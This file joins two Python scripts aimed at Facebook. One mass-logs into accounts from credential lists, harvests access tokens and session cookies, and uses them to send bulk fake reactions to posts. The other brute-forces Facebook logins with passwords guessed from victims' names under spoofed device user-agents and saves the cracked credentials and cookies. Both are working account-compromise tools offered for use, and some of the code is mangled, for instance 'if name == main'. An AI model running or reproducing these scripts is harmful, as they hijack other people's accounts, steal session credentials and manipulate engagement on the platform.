import os
import re
import json
import time
import uuid
import random
import logging
import requests
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from rich.console import Console
from rich.rule import Rule
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
console = Console()

DATA_DIR = Path.home() / "BOOSTING"
TOKEN_FILE = DATA_DIR / "toka.txt"
ID_FILE = DATA_DIR / "tokaid.txt"
COOKIE_FILE = DATA_DIR / "cok.txt"
COOKIE_ID_FILE = DATA_DIR / "cokid.txt"
PAGE_TOKEN_FILE = DATA_DIR / "tokp.txt"
PAGE_ID_FILE = DATA_DIR / "tokpid.txt"

COLORS = {
    'GREEN': '\033[1;32m',
    'RED': '\033[1;31m',
    'YELLOW': '\033[1;33m',
    'CYAN': '\033[1;36m',
    'RESET': '\033[0m'
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
]

def setup_files():
    DATA_DIR.mkdir(exist_ok=True)
    for file in [TOKEN_FILE, ID_FILE, COOKIE_FILE, COOKIE_ID_FILE, PAGE_TOKEN_FILE, PAGE_ID_FILE]:
        file.touch(exist_ok=True)

def get_ids_tokens(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]File not found: {file_path}[/red]")
        return []

def save_valid_data(file_path, data):
    with open(file_path, 'w') as file:
        file.writelines(f"{line}\n" for line in data)

def linex():
    console.print(Rule(style="cyan", characters="━", align="center"))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(f"""""")

def count_lines(file_path):
    try:
        with open(file_path, 'r') as file:
            return sum(1 for line in file)
    except FileNotFoundError:
        return 0

def overview():
    total_accounts = count_lines(TOKEN_FILE)
    total_pages = count_lines(PAGE_TOKEN_FILE)
    console.print(f"[cyan]┏━━━━━━━━━━━━━━━━━━━━━━━≻ 𝙾𝚅𝙴𝚁 𝚅𝙸𝙴𝚆 ≺━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    console.print(f"[cyan]          TOTAL ACCOUNTS[yellow]: [green]{total_accounts}[/green]  ┃  TOTAL PAGES[yellow]: [green]{total_pages}[/green]             [/cyan]")
    console.print(f"[cyan]┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛[/cyan]")

def cuser(user, passw, user_choice='y'):
    access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    device_id = str(uuid.uuid4())
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Connection-Type': 'MOBILE.LTE',
    }
    data = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
        'device_id': device_id,
        'email': user,
        'password': passw,
        'access_token': access_token,
        'generate_session_cookies': '1',
        'locale': 'en_US',
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
    }
    try:
        response = requests.post('https://graph.facebook.com/auth/login', headers=headers, data=data, timeout=30)
        pos = response.json()
        if 'session_key' in pos:
            cookie = ';'.join(f"{i['name']}={i['value']}" for i in pos['session_cookies'])
            c_user_value = next(i['value'] for i in pos['session_cookies'] if i['name'] == 'c_user')
            console.print(f"[green]Success: {user} extracted successfully.[/green]")
            if user_choice.lower() in ['n', 'no']:
with open(PAGE_TOKEN_FILE, 'a') as f:
                    f.write(f'{pos["access_token"]}\n')
                with open(PAGE_ID_FILE, 'a') as f:
                    f.write(f'{c_user_value}\n')
            else:
                with open(TOKEN_FILE, 'a') as f:
                    f.write(f'{pos["access_token"]}\n')
                with open(ID_FILE, 'a') as f:
                    f.write(f'{c_user_value}\n')
            with open(COOKIE_FILE, 'a') as f:
                f.write(f'{cookie}\n')
            with open(COOKIE_ID_FILE, 'a') as f:
                f.write(f'{c_user_value}\n')
        else:
            console.print(f"[red]Failed: {user} - {pos.get('error', {}).get('message', 'Unknown error')}[/red]")
    except Exception as e:
        console.print(f"[red]Error: {user} failed due to: {e}[/red]")

def linktradio(post_link):
    match = re.search(r'(?:posts|permalink\.php\?story_fbid=)(\d+)', post_link)
    if match:
        return match.group(1)
    console.print(f"[red]Invalid post link format[/red]")
    return None

def react_to_post(actor_id, post_id, react, token):
    url = f'https://graph.facebook.com/v19.0/{actor_id}_{post_id}/reactions'
    params = {'access_token': token, 'type': react}
    try:
        response = requests.post(url, params=params)
        if response.status_code == 200:
            console.print(f"[green]Successfully reacted: {actor_id} → {post_id} with {react}[/green]")
            return True
        else:
            console.print(f"[red]Failed to react: {actor_id} → {post_id} - {response.json().get('error', {}).get('message', 'Unknown error')}[/red]")
            return False
    except Exception as e:
        console.print(f"[red]Error in reaction: {str(e)}[/red]")
        return False

def choose_reaction():
    reactions = {
        '1': 'LIKE', '2': 'LOVE', '3': 'HAHA', '4': 'WOW',
        '5': 'CARE', '6': 'SAD', '7': 'ANGRY'
    }
    console.print("[cyan]1: LIKE\n2: LOVE\n3: HAHA\n4: WOW\n5: CARE\n6: SAD\n7: ANGRY[/cyan]")
    linex()
    choice = input('Choose: ').strip()
    return reactions.get(choice)

def quick_reaction():
    clear()
    actor_ids = get_ids_tokens(ID_FILE)
    tokens = get_ids_tokens(TOKEN_FILE)
    post_link = input('Enter the Facebook post link: ').strip()
    post_id = linktradio(post_link)
    if not post_id:
        return
    max_limit = min(len(actor_ids), len(tokens))
    limit = int(input(f'Input quantity of reactions (1-{max_limit}): '))
    limit = max(1, min(limit, max_limit))
    react = choose_reaction()
    if not react:
        console.print(f"[red]Invalid reaction choice[/red]")
        return
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(react_to_post, actor_id, post_id, react, token)
                   for actor_id, token in zip(actor_ids[:limit], tokens[:limit])]
        for future in futures:
            future.result()
    console.print(f"[green]All reactions completed![/green]")

def menu():
    clear()
    overview()
    console.print(f"[cyan]┏━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━┓[/cyan]")
    console.print(f"[cyan]┃   ┃                 Sec/Minutes process                  ┃   ┃[/cyan]")
    console.print(f"[cyan]┃   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   ┃[/cyan]")
    options = [
        ("01", "ADD ACCOUNT", "Page & Normal Account"),
        ("02", "AUTO REACT W/O CARE", "Page & Normal Account"),
        ("03", "AUTO REACT DP & COVER", "Page & Normal Account"),
        ("00", "EXIT", "Exiting The Tool User")
    ]
    for num, desc, note in options:
        console.print(f"[cyan]┃[yellow]「{num}」[cyan]{desc:<25} [cyan]- [yellow]「{note}」   [cyan]┃[/cyan]")
    console.print(f"[cyan]┗━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
choice = input(f"  ┗━━⫸ : ").upper()
    if choice in ('1', '01'):
        start_tool()
    elif choice in ('2', '02'):
        quick_reaction()
    elif choice in ('0', '00'):
        console.print(f"[red]Thank You For Using Spectre Boosting Tools[/red]")
    else:
        console.print(f"[red]INVALID CHOICE.[/red]")

def start_tool():
    clear()
    linex()
    console.print("[cyan]「1」MANUAL THROUGH INPUT[/cyan]")
    console.print("[cyan]「2」MANUAL THROUGH FILE[/cyan]")
    console.print("[cyan]「3」AUTOMATIC THROUGH OPTION[/cyan]")
    console.print("[cyan]「0」BACK TO MENU![/cyan]")
    linex()
    choice = input('「Choose」 : ')
    if choice == '1':
        Manual()
    elif choice == '2':
        ManFile()
    elif choice == '3':
        Auto()
    elif choice == '0':
        menu()
    else:
        console.print(f"[red]Invalid option.[/red]")
        start_tool()

def Manual():
    user_choice = input(f"[yellow]Input y for account, n for page, or blank for default (y/n): [/yellow]")
    linex()
    user = input("USER ID/EMAIL: ")
    linex()
    passw = input("PASSWORD: ")
    linex()
    threading.Thread(target=cuser, args=(user, passw, user_choice)).start()

def Auto():
    clear()
    directory = Path.home()
    txt_files = [f for f in directory.glob('*.txt') if f.is_file()]
    if not txt_files:
        console.print(f"[red]No .txt files found in {directory}[/red]")
        return
    linex()
    for i, filename in enumerate(txt_files, start=1):
        console.print(f"[cyan]「{i}」 {filename}[/cyan]")
    linex()
    try:
        choice = int(input(f'「Choose」 : '))
        if 1 <= choice <= len(txt_files):
            selected_file = txt_files[choice - 1]
            user_choice = input(f"[yellow]Input y for account, n for page, or blank for default (y/n): [/yellow]")
            linex()
            with open(selected_file, 'r') as file:
                for line in file:
                    user_pass = line.strip().split('|')
                    if len(user_pass) == 2:
                        threading.Thread(target=cuser, args=(user_pass[0], user_pass[1], user_choice)).start()
                        time.sleep(2)
                    else:
                        console.print(f"[red]Invalid format in line: {line.strip()}[/red]")
        else:
            console.print(f"[red]Invalid option.[/red]")
    except ValueError:
        console.print(f"[red]Invalid input.[/red]")

def ManFile():
    file = input('「?」Put file path: ')
    if os.path.isfile(file):
        user_choice = input(f"[yellow]Input y for account, n for page, or blank for default (y/n): [/yellow]")
        linex()
        with open(file, 'r') as f:
            for line in f:
                user_pass = line.strip().split('|')
                if len(user_pass) == 2:
                    threading.Thread(target=cuser, args=(user_pass[0], user_pass[1], user_choice)).start()
                    time.sleep(2)
                else:
                    console.print(f"[red]Invalid format in line: {line.strip()}[/red]")
    else:
        console.print(f"[red]File location not found[/red]")

if name == 'main':
    setup_files()
    menu()
import requests
import sys
import uuid
import random
import os
import time
import datetime
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.columns import Columns

# Warna untuk teks output
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
U = '\x1b[1;95m'
N = '\x1b[0m'
W = '\033[97m'  # Putih
R = '\033[91m'  # Merah
G = '\033[92m'  # Hijau

# Definisikan informasi dinamis
tool = "FILE v1.0"
owner = "FILE DUMP"
bit = "64-bit"
version = "1.0.0"

# Mendapatkan tanggal hari ini dalam format yang diinginkan
date = datetime.datetime.now().strftime("%Y-%m-%d")

# Logo dan format string
logo = f"""{H}
    JJ   SSSSS    OOOO    NN   NN    XX   XX  DDDD  
    JJ SS       OO    OO  NNN  NN     XX XX   DD  DD 
    JJ   SSSS   OO    OO  NN N NN      XXX    DD  DD 
JJ  JJ       SS OO    OO  NN  NNN     XX XX   DD  DD 
 JJJJ   SSSSS     OOOO    NN   NN    XX   XX  DDDD 
{P}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{P}
TOOL OWNER    {M}:{P} FOUNDER X JSON
TOOL TYPE     {M}:{P} RANDOM ID CRACK {M}[{H}V1.0{M}]
TOOL STATUS   {M}:{P} \x1b[0;45mPREMIUM\x1b[0;91m{P}
YOUR KEY      {M}:{H} PRIVATE
{P}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═━═━══━═━═━══━═━"""
def line():print(f"{P}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══")
# Pilih warna acak untuk output
wardom = random.choice([M, K, H, P])
import random

def fuckx():
    model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
    bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    return bal

# Kelas utama untuk melakukan cracking
class FounderClone:
    def init(self):
        self.FounderClone_file = input(f'{P} ▶ Example : {H}/sdcard/file.txt...\n{P} Input File ▶ {H} ')
        self.FounderClone_oks = 0
        self.FounderClone_cps = 0
        self.FounderClone_loop = 0
        self.FounderClone_uidlist = []

    # Fungsi untuk membersihkan file
    def FounderClone_bersihkan_file(self):
        bersih = []
        with open(self.FounderClone_file, 'r', encoding='utf-8') as f:
            for line in f:
                user = line.strip()
                if '|' in user:
                    parts = user.split('|', 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        bersih.append(user)
        self.FounderClone_uidlist = bersih

    # Fungsi untuk memulai cracking
    def FounderClone_mulai(self):
        self.FounderClone_bersihkan_file()
        os.system("clear");print(logo);print(f"{P}▶ Total Account : {H} {len(self.FounderClone_uidlist)}");print(f"{P}▶ Method ▶ SERVER S1");line()
        with ThreadPoolExecutor(max_workers=30) as eksekutor:
            for user in self.FounderClone_uidlist:
                uid, nama = user.split('|')
                nama = nama.lower()
                depan = nama.split(' ')[0] if " " in nama else nama
                pasw = []
                if len(nama) < 6:
                    if len(depan) >= 3:
                        pasw += [nama, depan + "12", depan + "123", depan + "123", depan + "12345", depan + "123456", depan + "321", depan + "01", depan + "02", depan + "03", depan + "04", depan + "05", depan + "06", depan + "07"]
else:
                    pasw += [nama, depan + "12", depan + "123", depan + "123", depan + "12345", depan + "123456", depan + "321", depan + "01", depan + "02", depan + "03", depan + "04", depan + "05", depan + "06", depan + "07"]
                eksekutor.submit(self._FounderClone_validate, uid, pasw)

    # Fungsi untuk validasi login
    def _FounderClone_validate(self, uid, pasw):
        ses = requests.Session()
        ua = fuckx()
        sys.stdout.write(f"\r{wardom}{uid} {P} loop : {H}{self.FounderClone_loop}{P} {P}Succes : {H}{str(self.FounderClone_oks)} {P}Failed : {K}{str(self.FounderClone_cps)}")
        sys.stdout.flush()
        for pwku in pasw:
            try:
                data = {
                    "kids_xudina": str(uuid.uuid4()),
                    "format": "json",
                    "sha_kids_bokachoda": str(uuid.uuid4()),
                    "FUCK_ARAFAT": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": uid,
                    "password": pwku,
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                }
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "User-Agent": ua,
                    "X-FB-Net-HNI": "45204",
                    "X-FB-SIM-HNI": "45201",
                    "X-FB-Connection-Type": "unknown",
                    "Connection": "Keep-Alive",
                }
                url = "https://graph.facebook.com/auth/login"
                founder = ses.post(url, data=data, headers=headers, allow_redirects=False).json()
                if "access_token" in founder:
                    self.FounderClone_oks += 1
                    coki = ";".join(i["name"] + "=" + i["value"] for i in founder["session_cookies"])
                    print(f"\r{H} {uid}{P}|{H}{pwku}\n{P}{coki}\n")
                    open("/sdcard/STOKFBOLD/file-ok.txt","a").write(f"{uid}|{pwku}|{coki}\n")
                    break
                elif "User must verify their account" in founder.get("error", {}).get("message", ""):
                    self.FounderClone_cps += 1
                    print(f"\r{P} {uid}|{pwku}\n{P} {ua}\n")
                    open("/sdcard/STOKFBOLD/file-cp.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                sleep(10)
        self.FounderClone_loop += 1

# Menjalankan program utama
if name == 'main':
    os.system('clear')
    print(logo)
    founder = FounderClone()
    founder.FounderClone_mulai()
